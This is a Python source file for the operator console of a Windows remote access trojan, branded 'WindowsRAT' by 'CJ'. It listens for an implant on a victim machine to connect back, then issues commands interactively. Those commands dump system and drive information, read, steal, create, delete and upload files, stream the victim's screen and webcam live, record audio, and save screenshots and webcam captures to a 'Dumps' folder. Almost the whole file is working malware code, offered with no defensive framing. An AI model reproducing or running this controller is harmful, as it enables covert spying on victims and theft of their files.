#
#  _                                _                __          __ _  _    _        _____      _ 
# | |                              (_)               \ \        / /(_)| |  | |      / ____|    | |
# | |      ___   __ _  _ __  _ __   _  _ __    __ _   \ \  /\  / /  _ | |_ | |__   | |         | |
# | |     / _ \ / _` || '__|| '_ \ | || '_ \  / _` |   \ \/  \/ /  | || __|| '_ \  | |     _   | |
# | |____|  __/| (_| || |   | | | || || | | || (_| |    \  /\  /   | || |_ | | | | | |____| |__| |
# |______|\___| \__,_||_|   |_| |_||_||_| |_| \__, |     \/  \/    |_| \__||_| |_|  \_____|\____/ 
#                                              __/ |                                              
#                                             |___/                         -  By CJ
#
# YouTube : www.youtube.com/@LearningWithCJ
# GitHub  : www.github.com/LearningWithCJ
# Telegram: t.me/LearningWithCJ
#

import sys
import os
import platform
import time
import socket
import queue
import threading
import base64
import cv2
import numpy as np



IP = ""
PORT = 0
SOC = None
conn_from = ""
banner = """\033[1m\033[97m
 __                __              _       _____         _______
 \ \      __      / /_            | |     |  __ \     /\|__   __|
  \ \    /  \    / /(_)  _ __   __| | ___ | |__) |   /  \  | |
   \ \  / /\ \  / / | | | '_ \ / _  |/ _ \|  _  /   / /\ \ | |
    \ \/ /  \ \/ /  | | | | | | (_| | (_) | | \ \  / ____ \| |
     \__/    \__/   |_| |_| |_|\__,_|\___/|_|  \_\/_/    \_\_|
    
                                           -  By CJ
"""

def stdOutPut(type, text):
    if type == "info": return "\033[0m\033[1m[\033[33mINFO\033[39m]\033[1m%s\033[0m" % text
    elif type == "error": return "\033[0m[\033[31mERROR\033[0m]\033[1m%s\033[0m" % text
    elif type == "warning": return "\033[0m[\033[33mWARNING\033[0m]\033[1m%s\033[0m" % text
    elif type == "success": return "\033[0m[\033[32mSUCCESS\033[0m]\033[1m%s\033[0m" % text


def ClearDirec():
    if (platform.system() == 'Windows'):
        clear = lambda: os.system('cls')
        direc = "\\"
    else:
        clear = lambda: os.system('clear')
        direc = "/"
    return clear, direc

clear, direc = ClearDirec()

def animate(message):
    chars = "/—\\|"
    for char in chars:
        sys.stdout.write('\r' + stdOutPut('info', "\033[1m%s \033[31m%s\033[0m" % (message, char)))
        time.sleep(0.1)
        sys.stdout.flush()
        

def GSF(size): # get size format
    text = ""
    if size < 1024:
        text = str(size) + " B"
    elif size >= 1024 and size < 1048576:
        text = str(round(size / 1024, 2)) + " KB"
    elif size >= 1048576 and size < 1073741824:
        text = str(round(size / 1024 ** 2, 2)) + " M"
    elif size >= 1073741824 and size < 1099511627776:
        text = str(round(size / 1024 ** 3, 2)) + " G"
    return text


def getcwd(name):
    return os.getcwd() + direc + name

def showInfo(conn):
    data = recvall(conn)
    saveFile("showInfo", data, ".txt", False)
    print("\n" + data)


def getDrives(conn):
    data = recvall(conn)
    saveFile("getDrives", data, ".txt", False)
    print("\n" + data)


def showFiles(conn):
    data = recvall(conn)
    print("\n" + data)


def createDir(conn):
    data = recvall(conn)
    print("\n" + data)


def deleteDir(conn):
    data = recvall(conn)
    print("\n" + data)


def createFile(conn):
    data = recvall(conn)
    print("\n" + data)


def deleteFile(conn):
    data = recvall(conn)
    print("\n" + data)  


def copy(conn):
    data = recvall(conn)
    print("\n" + data) 


def getFile(conn):
    data = recvall(conn)
    if "doesn't exist!" not in data: saveFile("file", data.split("\n")[0], data.split("\n")[1], True)
    else: print("\n" + data)
    

def sendFile(conn, path):
    data = []
    path = " ".join(path)
    if os.path.exists(path):
        try:
            print(stdOutPut('info', "Encoding..."), end='\r', flush=True)
            with open(path, "rb") as file:
                convert = base64.b64encode(file.read())
            len_data = len(convert)
            num = 0
            while True:
                if len_data - num > 4096:
                    data.append(convert[num:num + 4096])
                    num += 4096
                else:
                    data.append(convert[num:])
                    break
            data.append("\n" + os.path.basename(path))
        except:
            data = []
            data.append("error")
            print(f"Can't open this path ({path})")
    else:
        print(f"This path ({path}) doesn't exist!")
        data.append("error")
    data.append("END123")
    sendall(conn, data)
    try:
        msg = conn.recv(4096).decode("UTF-8")
        if msg == "success":
            print(stdOutPut('success', "Saved on client system"), end='\r', flush=True)
        elif msg == "fail":
            print(stdOutPut('error', "Failed to save on client system"), end='\r', flush=True)
    except:
        get_shell2(SOC)
         

def alert(conn):
    try:
        msg = conn.recv(4096).decode("UTF-8")
        print(stdOutPut('warning', msg), end="\r", flush=True)
        msg = conn.recv(4096).decode("UTF-8")
        if msg == "Can't alert":
            print("\033[K" + stdOutPut('error', msg))
        else:
            print("\033[K" + stdOutPut('success', msg))
    except:
        get_shell2(SOC)


def speak(conn):
    try:
        msg = conn.recv(4096).decode("UTF-8")
        print(stdOutPut('warning', msg), end="\r", flush=True)
        msg = conn.recv(4096).decode("UTF-8")
        if msg == "Can't speak":
            print("\033[K" + stdOutPut('error', msg))
        else:
            print("\033[K" + stdOutPut('success', msg))
    except:
        get_shell2(SOC)


def device(conn):
    msg = conn.recv(4096).decode("UTF-8")
    print(msg)


def live(conn):
    msg = conn.recv(4096).decode("UTF-8")
    if msg == "webcam":
        msg = conn.recv(4096).decode("UTF-8")
        if msg == "have webcam":
            path = checkDir("webcam", ".avi")
            resolution = None
            codec = cv2.VideoWriter_fourcc(*'XVID')
            fps = 30.0
            out = None

            while True:
                msg = conn.recv(4096).decode("UTF-8")
                if msg == "Went to problem":
                    print(msg)
                    break
                frame_size = int.from_bytes(conn.recv(4), byteorder='big')
                img_bytes = b''
                while len(img_bytes) < frame_size:
                    packet = conn.recv(frame_size - len(img_bytes))
                    if not packet:
                        break
                    img_bytes += packet
                nparr = np.frombuffer(img_bytes, np.uint8)
                frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                if resolution == None:
                    resolution = (frame.shape[1], frame.shape[0])
                    out = cv2.VideoWriter(path, codec, fps, resolution)
                out.write(frame)
                cv2.imshow("video", frame)
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    conn.send("break".encode("UTF-8"))
                    break
                conn.send("continue".encode("UTF-8"))
            out.release()
            cv2.destroyAllWindows()
        else:
            print(msg)
    else:
        path = checkDir("screen", ".avi")
        resolution = None
        codec = cv2.VideoWriter_fourcc(*'XVID')
        fps = 30
        out = None
        while True:
            frame_size = int.from_bytes(conn.recv(4), byteorder='big')
            img_bytes = b''
            while len(img_bytes) < frame_size:
                packet = conn.recv(frame_size - len(img_bytes))
                if not packet:
                    break
                img_bytes += packet
            nparr = np.frombuffer(img_bytes, np.uint8)
            frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            if resolution == None:
                resolution = (frame.shape[1], frame.shape[0])
                out = cv2.VideoWriter(path, codec, fps, resolution)
            out.write(frame)
            frame = cv2.resize(frame, (1600, 900))
            cv2.imshow("video", frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                conn.send("break".encode("UTF-8"))
                break
            conn.send("continue".encode("UTF-8"))
        out.release()
        cv2.destroyAllWindows()


def screenshot(conn):
    data = recvall(conn)
    saveFile("screenshot", data, ".png", True)


def video(conn):
    data = recvall(conn)
    saveFile("video", data, ".avi", True)


def voice(conn):
    data = recvall(conn)
    saveFile("voice", data, ".wav", True)


def webcamPhoto(conn):
    data = recvall(conn)
    if data == "False":
        print("Doesn't have webcam!")
    else:    
        saveFile("webcamPhoto", data, ".png", True) 


def webcamVideo(conn):
    data = recvall(conn)
    if data == "False":
        print("Doesn't have webcam!")
    else:    
        saveFile("webcamVideo", data, ".avi", True)


def saveFile(title, data, format, decode):
    timestr = time.strftime("%Y-%m-%d_%H-%M-%S")
    dir = getcwd("Dumps")
    maindir = dir + direc + title
    path = maindir + direc + title + "(" + timestr + ")" + format
    if not os.path.exists(dir):
        try:
            os.mkdir(dir)
        except:
            print(stdOutPut('error', f"Not able to make directory ({dir})"))
            return
    if not os.path.exists(maindir):
        try:
            os.mkdir(maindir)
        except:
            print(stdOutPut('error', f"Not able to make directory ({maindir})")) 
            return
    if not decode:
        with open(path, "w+") as file:
            try:
                file.write(data)
                print(stdOutPut('success', f"Saved in {path}"))
            except:
                print(stdOutPut('error', "Not able to save the file"))
            file.close()
    else:
        with open(path, "wb") as file:
            try:
                fileData = base64.b64decode(data)
                file.write(fileData)
                print(stdOutPut('success', f"Saved in {path}"))
            except:
                print(stdOutPut('error', "Not able to save the file"))   
            file.close()


def checkDir(title, format):
    timestr = time.strftime("%Y-%m-%d_%H-%M-%S")
    dir = getcwd("Dumps")
    dir1 = dir + direc + "live"
    maindir = dir1 + direc + title
    path = maindir + direc + title + "(" + timestr + ")" + format

    if not os.path.exists(dir):
        try:
            os.mkdir(dir)
        except:
            return False
    if not os.path.exists(dir1):
        try:
            os.mkdir(dir1)
        except:
            return False
    if not os.path.exists(maindir):
        try:
            os.mkdir(maindir)
        except:
            return False
    return path


def sendall(conn, data): 
    try:
        num = 0
        if data[0] == "error":
            while True:
                conn.send(data[num].encode("UTF-8"))
                if data[num] == "END123":
                    break
                else:
                    num += 1
        else:
            buff = 0
            len_data = 0
            for i in range(len(data)):
                len_data += len(data[i])
            print(stdOutPut('info', "Uploading...") + "\n", end='\r', flush=True)
            while True:
                try:
                    buff += conn.send(data[num])
                except:
                    buff += conn.send(data[num].encode("UTF-8"))  
                done = int(100 * (buff / len_data))
                sys.stdout.write("\r[{}%] [{}{}] [{}/{}]".format(str(done), "-" * (int(done / 3)), " " * (int(100 / 3) - int(done / 3)), buff, len_data))
                sys.stdout.flush() 
                if data[num] == "END123":
                    break
                else:    
                    num += 1
            print("\033[F\033[K" + stdOutPut('success', "Uploaded") + "\033[1B")
    except:
        get_shell2(SOC)


def recvall(conn):
    try:
        data = ""
        buff = ""
        len_data = int(conn.recv(1024).decode("UTF-8"))
        max_text = "[100%] [{}] [{}/{}]".format("-" * int(100 / 3), GSF(len_data), GSF(len_data))
        print(stdOutPut('info', "Downloading...") + "\n", end='\r', flush=True)
        while "END123" not in data:
            data = conn.recv(4096).decode("UTF-8", "ignore")
            buff += data
            done = int(100 * (len(buff) / len_data))
            text = "[{}%] [{}{}] [{}/{}]".format(str(done), "-" * (int(done / 3)), " " * (int(100 / 3) - int(done / 3)), GSF(len(buff)), GSF(len_data))
            sys.stdout.write("\r{}{}".format(text, " " * (len(max_text) - len(text))))
            sys.stdout.flush()
        print("\033[F\033[K" + stdOutPut('success', "Downloaded") + "\033[1B")
        return buff.strip().replace("END123", "").strip()
    except:
        get_shell2(SOC)


def get_shell1(ip, port):
    try:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except Exception as e:
            print(stdOutPut("error", "%s" % e)); sys.exit()
        soc.bind((str(ip), int(port)))
        soc.listen()
        global IP
        IP = ip
        global PORT
        PORT = port
        global SOC
        SOC = soc
        get_shell2(soc)
    except Exception as e:
        print(stdOutPut("error", "%s" % e))


def get_shell2(soc):
    print(banner)
    clear()
    print(banner)
    que = queue.Queue()
    t = threading.Thread(target=connection_checker, args=[soc, que], daemon=True)
    t.start()
    while t.is_alive(): animate("Waiting for Connection")
    t.join()
    conn, addr = que.get()
    clear()
    conn_from = "\033[1m\033[33mGot connection from \033[31m" + "".join(str(addr)) + "\033[0m"
    print(conn_from)
    print(" ")
    while True:
        print(stdOutPut('info', "Waiting for response..."), end='\r', flush=True)
        try:
            msg = conn.recv(4096).decode("UTF-8")
        except:
            break
        print("\033[K\033[F")
        if msg.strip() == "showInfo":
            showInfo(conn)
        elif msg.strip() == "getDrives":
            getDrives(conn)
        elif msg.strip() == "showFiles":
            showFiles(conn)
        elif msg.strip() == "createDir":
            createDir(conn)
        elif msg.strip() == "deleteDir":
            deleteDir(conn)
        elif msg.strip() == "createFile":
            createFile(conn)
        elif msg.strip() == "deleteFile":
            deleteFile(conn)
        elif msg.strip() == "copy":
            copy(conn)
        elif msg.strip() == "getFile":
            getFile(conn)
        elif msg.split()[0].strip() == "sendFile":
            sendFile(conn, msg.split()[1:])  
        elif msg.strip() == "alert":
            alert(conn)  
        elif msg.strip() == "speak":
            speak(conn)  
        elif msg.strip() == "device":
            device(conn)  
        elif msg.strip() == "live":
            live(conn)    
        elif msg.strip() == "screenshot":
            screenshot(conn)  
        elif msg.strip() == "video":
            video(conn)  
        elif msg.strip() == "voice":
            voice(conn) 
        elif msg.strip() == "webcamPhoto":
            webcamPhoto(conn)
        elif msg.strip() == "webcamVideo":
            webcamVideo(conn)
        else:
            if msg == "Unknow Command": print(stdOutPut("error", "%s"%msg))
            elif "Hello there" in msg:
                conn_from += "\n\n" + "\033[1m" + msg
                print("\033[1m" + msg)
            elif msg == "clear": 
                clear()
                print(conn_from)
            else: print(msg)
        while True:
            message_to_send = input("\n\033[1m\033[36mInterpreter:/> \033[0m")
            if message_to_send.split() != []:
                print(" ")
                break
            else:
                print("\033[F\033[K\033[F\033[F")
        try:
            print(stdOutPut('info', "Sending..."), end='\r', flush=True)
            conn.send(message_to_send.encode("UTF_8"))
        except:
            break
        if message_to_send.strip() == "exit":
            print("\033[K\033[1m\033[32mDon't worry, CJ will help you -_^\033[0m\n", end='\r', flush=True)
            sys.exit()
    get_shell2(SOC)


def connection_checker(soc, que):
    conn, addr = soc.accept()
    que.put([conn, addr])
    return conn, addr
